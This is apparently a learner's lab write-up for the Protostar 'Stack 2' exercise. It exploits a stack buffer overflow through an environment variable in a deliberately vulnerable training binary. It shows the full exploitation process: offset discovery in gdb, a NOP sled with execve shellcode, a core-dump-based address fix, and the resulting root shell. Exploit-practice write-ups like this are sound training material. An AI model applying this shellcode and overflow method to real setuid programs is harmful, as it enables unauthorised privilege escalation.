{{ Exploit Exercises: Protostar - 0x01 - Stack 2

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack2/

        About:
        Stack2 looks at environment variables, and how they can be set.

    }}

    [x] {{ Intended Solution

        # Checking behavior when used as expected
        user@protostar:/opt/protostar/bin$ export GREENIE=fubar
        user@protostar:/opt/protostar/bin$ ./stack2
        Try again, you got 0x00000000

        # Overflowing the buffer
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "A"*150'`
        user@protostar:/opt/protostar/bin$ ./stack2
        Try again, you got 0x41414141
        Segmentation fault

        # Writing expected value to the variable 'modified'
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"'`
        user@protostar:/opt/protostar/bin$ ./stack2
        you have correctly modified the variable

    }}

    [x] {{ Root shell

        # Generate pattern
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        # Open program in gdb and crash it to get EIP
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x63413163

        Program received signal SIGSEGV, Segmentation fault.
        0x41386341 in ?? ()

        # Find offset
        > ./pattern.py -ol 41386341
        [+] Offset found at 84 bytes

        # Verify offset
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "A"*84 + "BBBB"'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x41414141

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()
        (gdb) i r eip
        eip            0x42424242   0x42424242

        # Crash program with nopsled to find which address to overwrite EIP with
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*150'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x90909090

        Program received signal SIGSEGV, Segmentation fault.
        0x90909090 in ?? ()
        (gdb) x/80x $esp-150
        ....
        0xbffff6aa: 0x186eb7ff  0x7ff4b7f0  0x6165b7fd  0x9090b7ec
        0xbffff6ba: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff6ca: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff6da: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff6ea: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff6fa: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff70a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff71a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff72a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff73a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff74a: 0x90909090  0xf7880000  0xdc48bfff  0x8a589586
        ....

        # Reuse shellcode from previous exercises
        # \x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
        # Buffer size is 84 bytes minus 24 bytes of shellcode leaves 60 bytes for the nopsled
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*60 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xba\xf6\xff\xbf"'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x5299580b

        Program received signal SIGSEGV, Segmentation fault.
        0xbffff6ba in ?? ()
        (gdb) q
        A debugging session is active.

            Inferior 1 [process 2820] will be killed.

        Quit anyway? (y or n) y
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*60 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xca\xf6\xff\xbf"'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x5299580b

        Program received signal SIGSEGV, Segmentation fault.
        0xbffff6cd in ?? ()
        (gdb) q
        A debugging session is active.

            Inferior 1 [process 2826] will be killed.

        Quit anyway? (y or n) y
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*60 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xda\xf6\xff\xbf"'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x5299580b

        Program received signal SIGILL, Illegal instruction.
        0xbffff6da in ?? ()

        # This isn't working - need to check the stack again
        (gdb) x/80x $esp-150
        ....
        0xbffff6fa: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff70a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff71a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff72a: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # The addresses has changed - need to quit gdb and update the payload
        (gdb) q
        A debugging session is active.

            Inferior 1 [process 2832] will be killed.

        Quit anyway? (y or n) y
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*60 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0a\xf7\xff\xbf"'`
        user@protostar:/opt/protostar/bin$ gdb stack2 -q
        Reading symbols from /opt/protostar/bin/stack2...done.
        (gdb) r
        Starting program: /opt/protostar/bin/stack2
        Try again, you got 0x5299580b
        Executing new program: /bin/dash
        $

        # That's more like it - let's see what happens when I run whoami and id
        $ whoami && id
        user
        uid=1001(user) gid=1001(user) groups=1001(user)

        # Good! Now let's run this outside gdb. Might need to dump the core to fix address issues
        user@protostar:/opt/protostar/bin$ ./stack2
        Try again, you got 0x5299580b
        Segmentation fault

        # Yup. Time to dump the core
        user@protostar:/opt/protostar/bin$ cp stack2 /tmp/
        user@protostar:/opt/protostar/bin$ cd /tmp/
        user@protostar:/tmp$ ./stack2
        Try again, you got 0x5299580b
        Segmentation fault (core dumped)

        # Now the program and core dump needs to be loaded into gdb
        user@protostar:/tmp$ gdb stack2 core.11.stack2.2860 -q
        Reading symbols from /tmp/stack2...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack2'.
        Program terminated with signal 11, Segmentation fault.
        #0  0xbffff70a in ?? ()

        # Time to have a look at the stack
        (gdb) x/80x $esp-150
        ....
        0xbffff73a: 0x186eb7ff  0x7ff4b7f0  0x6165b7fd  0x9090b7ec
        0xbffff74a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff75a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff76a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff77a: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # Ok - with these new addresses I exit the gdb, update the payload and run the original program again
        (gdb) q
        user@protostar:/tmp$ cd /opt/protostar/bin/
        user@protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "\x90"*60 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x4a\xf7\xff\xbf"'`
        user@protostar:/opt/protostar/bin$ ./stack2
        Try again, you got 0x5299580b
        #

        # This looks very promissing! Time for whoami and id
        # whoami && id
        root
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

    }}

    [~] {{ What did I learn?

        → Environmental variables...
            → ... can also be used to exploit buffer overflows just like any other user controlled input
            → ... MUST be set in the same terminal session as the program is executed from

    }}

}}